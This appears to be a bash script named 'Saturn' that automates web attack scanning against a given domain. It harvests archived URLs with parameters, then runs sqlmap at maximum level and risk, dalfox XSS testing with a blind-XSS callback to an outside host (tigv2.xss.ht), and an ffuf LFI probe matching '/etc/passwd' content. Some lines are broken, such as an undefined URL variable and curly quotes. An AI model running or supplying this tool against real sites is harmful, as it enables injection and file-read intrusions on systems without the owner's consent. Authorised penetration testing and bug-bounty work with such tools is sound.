#!/bin/bash
#Defining required functions

echo -e "
\e[1;35m                .                                            .
     *   .                  .              .        .   *          .
  .         .                     .       .           .      .        .
        o                             .                   .
         .              .                  .           .
          0     .
                 .          .                 ,                ,    ,
 .          \          .                         .
      .      \   ,
   .          o     .                 .                   .            .
     .         \                 ,             .                .
               #\##\#      .                              .        .
             #  #O##\###                .                        .
   .        #*#  #\##\###                       .                     ,
        .   ##*#  #\##\##               .                     .
      .      ##*#  #o##\#         .                             ,       .
          .     *#  #\#     .                    .             .          ,
                      \          .                         .
____^/\___^--____/\____O______________/\/\---/\___________---______________
   /\^   ^  ^    ^                  ^^ ^  '\ ^          ^       ---
         --           -            --  -      -         ---  __       ^
   --  __                      ___--  ^  ^                         --  __ 

							-By Prameya \033[0m
"

check() {
  which $1 > /dev/null 2>&1
  if [ $? = 1 ] ; then
    echo "please install $1"
    exit 1
  fi
}

sqli() {
  cat ./$domain/$domain'params.txt' | grep "\?" | head -20 | httpx -silent | tee ./$domain/$domain'sqli.txt'
  sqlmap -m ./$domain/$domain'sqli.txt' --batch --random-agent --level=5 --risk=3 | tee ./$domain/$domain'SQLi.txt'
  rm ./$domain/$domain'sqli.txt'
}

xss() {
cat ./$domain/$domain'params.txt' | Gxss -p black | sort | uro | tee ./$domain/$domain'XSS.txt'
dalfox file ./$domain/$domain'XSS.txt' -b tigv2.xss.ht pipe
}

lfi() {
cat ./$domain/$domain'params.txt' | gf black | qsreplace FUZZ | tee ./$domain/$domain'LFI.txt'
cat ./$domain/$domain'LFI.txt' | while read $lfi; do ffuf -u $url -mr “root:x” -w ./LFI-Jhaddix.txt; done
}

usage=$(echo Use "Bash saturn.sh --flags domain.com | Flags availables -> -X or--xss | -S or--sqli | -L or--lfi | -A or --all ")
echo -e "\e[1;33mStarting Saturn....\033[0m"

#Must be run as a root user

uid=$(id -u)
if [[ $uid != 0 ]]
then
	echo "The tool must be run as a root user :D"
	exit 1
fi

#Checking for empty arguments                                                                                                                                                                                 
if [ $# -eq 0 ]; then                                                                                                                                                                         
    echo $usage # run usage function                                                                                                                                                         
    exit 1                                                                                                                                                                                    
fi

#Validating Domain

if [[ "${@: -1}" != "" ]]; then
	domain="${@: -1}"
else
	domain=.
fi

validate="^([a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]\.)+[a-zA-Z]{2,}$"

if [[ "$domain" =~ $validate ]]; then
	echo "Valid Domain"
else
	echo "Not a valid Domain"
	exit 1
fi

#Checking for tools

check "gau"
check "Gxss"
check "uro"
check "httpx"
check "ffuf"

#Collecting the urls
#creating a new file for the target
mkdir ./$domain

#using gau and waybackurls to collect params
gau $domain --subs | \
        grep "=" | \
        egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
        qsreplace -a | \
        tee ./$domain/$domain'params1.txt'

waybackurls $domain | tee ./$domain/$domain'params2.txt'

cat ./$domain/$domain'params1.txt' ./$domain/$domain'params2.txt' | sort | uro | tee ./$domain/$domain'params.txt'
rm ./$domain/$domain'params1.txt' ./$domain/$domain'params2.txt'

#Running the different vulnerabilities automation
while [ "$1" != "" ]; do
	case $1 in 
	-L | --lfi)
		lfi
		;;

	-S | --sqli)
		sqli
		;;
	-X | --xss)
		xss
		;;
	-A | --all)
		xss
		sqli
		lfi
		;;
	*)
		echo "usage"
		exit 1
		;;
	esac
	shift
done
